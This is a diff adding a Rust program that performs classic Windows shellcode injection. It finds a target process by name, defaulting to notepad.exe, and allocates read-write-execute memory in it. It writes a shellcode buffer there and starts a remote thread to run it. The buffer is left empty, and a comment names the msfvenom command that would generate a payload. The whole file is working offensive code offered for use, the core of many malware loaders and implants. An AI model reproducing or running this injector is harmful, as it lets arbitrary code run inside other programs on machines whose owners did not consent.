@@ -1,0 +1,172 @@
+#![allow(non_snake_case, non_camel_case_types)]
+
+use std::{ffi::CString, mem, ptr};
+
+// ─── Windows API types ────────────────────────────────────────────────────────
+type HANDLE    = *mut core::ffi::c_void;
+type DWORD     = u32;
+type BOOL      = i32;
+type LPVOID    = *mut core::ffi::c_void;
+type SIZE_T    = usize;
+type ULONG_PTR = usize;
+
+const PROCESS_ALL_ACCESS:     DWORD = 0x001F_0FFF;
+const MEM_COMMIT:             DWORD = 0x0000_1000;
+const MEM_RESERVE:            DWORD = 0x0000_2000;
+const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
+const TH32CS_SNAPPROCESS:     DWORD = 0x0000_0002;
+const INVALID_HANDLE_VALUE:   HANDLE = -1_isize as HANDLE;
+const INFINITE:               DWORD = 0xFFFF_FFFF;
+
+// ─── FFI declarations ─────────────────────────────────────────────────────────
+#[repr(C)]
+struct PROCESSENTRY32 {
+    dwSize:              DWORD,
+    cntUsage:            DWORD,
+    th32ProcessID:       DWORD,
+    th32DefaultHeapID:   ULONG_PTR,
+    th32ModuleID:        DWORD,
+    cntThreads:          DWORD,
+    th32ParentProcessID: DWORD,
+    pcPriClassBase:      i32,
+    dwFlags:             DWORD,
+    szExeFile:           [u8; 260],
+}
+
+#[link(name = "kernel32")]
+extern "system" {
+    fn OpenProcess(access: DWORD, inherit: BOOL, pid: DWORD) -> HANDLE;
+    fn VirtualAllocEx(proc: HANDLE, addr: LPVOID, size: SIZE_T, alloc: DWORD, protect: DWORD) -> LPVOID;
+    fn WriteProcessMemory(proc: HANDLE, base: LPVOID, buf: *const core::ffi::c_void, size: SIZE_T, written: *mut SIZE_T) -> BOOL;
+    fn CreateRemoteThread(proc: HANDLE, attr: LPVOID, stack: SIZE_T, start: LPVOID, param: LPVOID, flags: DWORD, tid: *mut DWORD) -> HANDLE;
+    fn WaitForSingleObject(handle: HANDLE, ms: DWORD) -> DWORD;
+    fn CloseHandle(handle: HANDLE) -> BOOL;
+    fn GetLastError() -> DWORD;
+    fn CreateToolhelp32Snapshot(flags: DWORD, pid: DWORD) -> HANDLE;
+    fn Process32First(snap: HANDLE, entry: *mut PROCESSENTRY32) -> BOOL;
+    fn Process32Next(snap: HANDLE, entry: *mut PROCESSENTRY32) -> BOOL;
+}
+
+// ─── RAII handle  ─────────────────────────────────────────────────────────────
+struct OwnedHandle(HANDLE);
+
+impl OwnedHandle {
+    fn new(h: HANDLE) -> Option<Self> {
+        (!h.is_null() && h != INVALID_HANDLE_VALUE).then_some(Self(h))
+    }
+    fn raw(&self) -> HANDLE { self.0 }
+}
+
+impl Drop for OwnedHandle {
+    fn drop(&mut self) { unsafe { CloseHandle(self.0); } }
+}
+
+// ─── Error type ───────────────────────────────────────────────────────────────
+#[derive(Debug)]
+enum InjectError {
+    ProcessNotFound(String),
+    OpenFailed(DWORD),
+    AllocFailed(DWORD),
+    WriteFailed(DWORD),
+    ThreadFailed(DWORD),
+}
+
+impl std::fmt::Display for InjectError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::ProcessNotFound(n) => write!(f, "process '{n}' not found"),
+            Self::OpenFailed(e)      => write!(f, "OpenProcess failed           {e:#010x}"),
+            Self::AllocFailed(e)     => write!(f, "VirtualAllocEx failed        {e:#010x}"),
+            Self::WriteFailed(e)     => write!(f, "WriteProcessMemory failed    {e:#010x}"),
+            Self::ThreadFailed(e)    => write!(f, "CreateRemoteThread failed    {e:#010x}"),
+        }
+    }
+}
+
+type Result<T> = std::result::Result<T, InjectError>;
+
+// ─── Process enumeration ──────────────────────────────────────────────────────
+fn find_pid(target: &str) -> Result<DWORD> {
+    let snap = unsafe {
+        OwnedHandle::new(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0))
+    }.expect("snapshot failed");
+
+    let mut entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
+    entry.dwSize = mem::size_of::<PROCESSENTRY32>() as DWORD;
+
+    unsafe {
+        if Process32First(snap.raw(), &mut entry) == 0 {
+            return Err(InjectError::ProcessNotFound(target.into()));
+        }
+        loop {
+            let name = entry.szExeFile
+                .split(|&b| b == 0)
+                .next()
+                .and_then(|s| std::str::from_utf8(s).ok())
+                .unwrap_or("");
+
+            if name.eq_ignore_ascii_case(target) {
+                return Ok(entry.th32ProcessID);
+            }
+            if Process32Next(snap.raw(), &mut entry) == 0 {
+                break;
+            }
+        }
+    }
+    Err(InjectError::ProcessNotFound(target.into()))
+}
+
+// ─── Injection ────────────────────────────────────────────────────────────────
+fn inject(pid: DWORD, sc: &[u8]) -> Result<()> {
+    let proc = unsafe {
+        OwnedHandle::new(OpenProcess(PROCESS_ALL_ACCESS, 0, pid))
+    }.ok_or_else(|| InjectError::OpenFailed(unsafe { GetLastError() }))?;
+
+    // allocate RWX region in target
+    let remote = unsafe {
+        VirtualAllocEx(
+            proc.raw(), ptr::null_mut(),
+            sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE,
+        )
+    };
+    if remote.is_null() {
+        return Err(InjectError::AllocFailed(unsafe { GetLastError() }));
+    }
+
+    // write shellcode
+    let mut written: SIZE_T = 0;
+    if unsafe {
+        WriteProcessMemory(proc.raw(), remote, sc.as_ptr().cast(), sc.len(), &mut written)
+    } == 0 {
+        return Err(InjectError::WriteFailed(unsafe { GetLastError() }));
+    }
+
+    // spawn remote thread at shellcode entry
+    let thread = unsafe {
+        OwnedHandle::new(CreateRemoteThread(
+            proc.raw(), ptr::null_mut(), 0,
+            remote, ptr::null_mut(), 0, ptr::null_mut(),
+        ))
+    }.ok_or_else(|| InjectError::ThreadFailed(unsafe { GetLastError() }))?;
+
+    unsafe { WaitForSingleObject(thread.raw(), INFINITE) };
+    Ok(())
+}
+
+// ─── Entry point ─────────────────────────────────────────────────────────────
+fn main() {
+    // generate payload: msfvenom -p windows/x64/exec CMD=calc.exe -f rust
+    let shellcode: &[u8] = &[];
+
+    let target = std::env::args()
+        .nth(1)
+        .unwrap_or_else(|| "notepad.exe".into());
+
+    match find_pid(&target).and_then(|pid| {
+        println!("[*] {target} → PID {pid}");
+        inject(pid, shellcode)
+    }) {
+        Ok(())  => println!("[+] thread executing"),
+        Err(e)  => eprintln!("[-] {e}"),
+    }
+}
